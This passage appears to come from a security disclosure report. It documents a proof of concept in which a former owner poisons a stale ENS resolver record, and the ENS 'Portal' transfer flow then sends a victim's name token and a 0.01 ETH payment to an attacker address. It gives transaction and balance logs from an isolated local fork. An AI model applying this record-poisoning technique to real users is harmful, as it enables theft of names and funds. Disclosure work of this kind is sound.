As secondary settlement evidence, a separate ordinary local account follows the same rendered attacker address and sends `0.01 ETH` to it. The payment receipt succeeds; the recipient balance increases by exactly `0.01 ETH`; the victim balance decreases by exactly `0.01 ETH` plus the measured `0.0000210006573 ETH` gas fee.
{% endstep %}
{% endstepper %}

The native Portal impact is an actual pair of mined production-path transactions, not a theoretical state assertion:

```
victimName:       audit-stale-resolver-victim-1787930630.eth
tokenId:          111691872372097001870290707158648147930855833852031452623577822318151830863872
victim:           0x90F79bf6EB2c4f870365E785982E1f101E93b906
entered name:     audit-stale-resolver-access-1787930625.eth
Portal resolved:  0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
owner before:     0x90F79bf6EB2c4f870365E785982E1f101E93b906
owner after:      0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

detach resolver tx: 0x3d60a09c3eed15c8a604fe2fc9f9276931e34d8b2750847659728422b2141384 (block 11585710, success)
transfer token tx:  0x1e6f86e072f2dcdde79a3bf6bd773fa33c8128978aa90321a8b9eacd231b6995 (block 11585711, success)
native transfer gas: 118108428315432 wei = 0.000118108428315432 ETH
assertion: ownerOf(tokenId) changed victim -> attacker
```

The downstream ETH payment is also an actual mined EOA transaction, not a theoretical loss calculation:

```
tx:     0x1bb9ed3cd62a0536dd2959c134f3fb273e4cb08087fa7e20a99a48bf602193b6
block:  11585712
from:   0x90F79bf6EB2c4f870365E785982E1f101E93b906
to:     0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
value:  0.01 ETH
status: success

Victim balance before: 9999998001125376627809 wei
Victim balance after:  9999987980124719327809 wei
Victim total loss:       10021000657300000 wei = 0.0100210006573 ETH

Recipient balance before: 10000000000000000000000 wei = 10000 ETH
Recipient balance after:  10000010000000000000000 wei = 10000.01 ETH
Recipient increase:      10000000000000000 wei = 0.01 ETH

paymentValueWei:    10000000000000000 wei
paymentFeeWei:         21000657300000 wei = 0.0000210006573 ETH
victimTotalLossWei: 10021000657300000 wei
assertion: victimTotalLossWei = paymentValueWei + paymentFeeWei
```

The recorded unauthorized record-write transaction is `0x73daef66718ccdcff853ac89b623af64dd12a51ef06f929cdf49b2e676af6168` in block `11585709`, with a `47,432,214,222,120 wei` fee. The primary native Portal impact transactions are `0x3d60a09c3eed15c8a604fe2fc9f9276931e34d8b2750847659728422b2141384` and `0x1e6f86e072f2dcdde79a3bf6bd773fa33c8128978aa90321a8b9eacd231b6995`, in blocks `11585710` and `11585711`; together they transfer the victim-owned name to the attacker-controlled address.

The recorded downstream payment is `0x1bb9ed3cd62a0536dd2959c134f3fb273e4cb08087fa7e20a99a48bf602193b6` in block `11585712`. The local ETH victim balance changed from `9,999.998001125376627809 ETH` to `9,999.987980124719327809 ETH`, a precisely measured loss of `10,021,000,657,300,000 wei` (`0.0100210006573 ETH`). The attacker-controlled recipient changed from `10,000 ETH` to `10,000.01 ETH`, exactly receiving the payment value of `10,000,000,000,000,000 wei`.

### PoC limitations and accuracy statement

All state, accounts, balances, and transactions are confined to the isolated Anvil Sepolia fork.

The primary impact proof is independent of the optional ETH payment. A former owner first poisons the `addr(60)` record of a buyer-owned ENS name. Then a separate account, `user4`, opens the real Portal ownership-transfer route for a different ENS name, enters the poisoned ENS name as the recipient, and sees the Portal resolve and display the attacker-controlled address.

`user4` signs the Portal’s production transaction-manager flow, which submits the resolver-detachment and ERC-1155 transfer transactions. The receipt and direct `ownerOf(victimTokenId)` read prove that the separately victim-owned name changed from `user4` to the attacker-controlled recipient. The attacker therefore does not self-transfer the asset; the PoC demonstrates a victim-signed transaction directed to an unintended recipient because of the poisoned Portal resolution.

The Portal has no native ETH-send route, so the additional `0.01 ETH` payment is secondary local-fork evidence and is not presented as live production loss. That optional payment uses `walletClient.sendTransaction()` only after capturing the exact attacker address rendered by the real Portal. It is a mined transaction from the separate victim account to the attacker-controlled account, with exact before/after balance accounting.
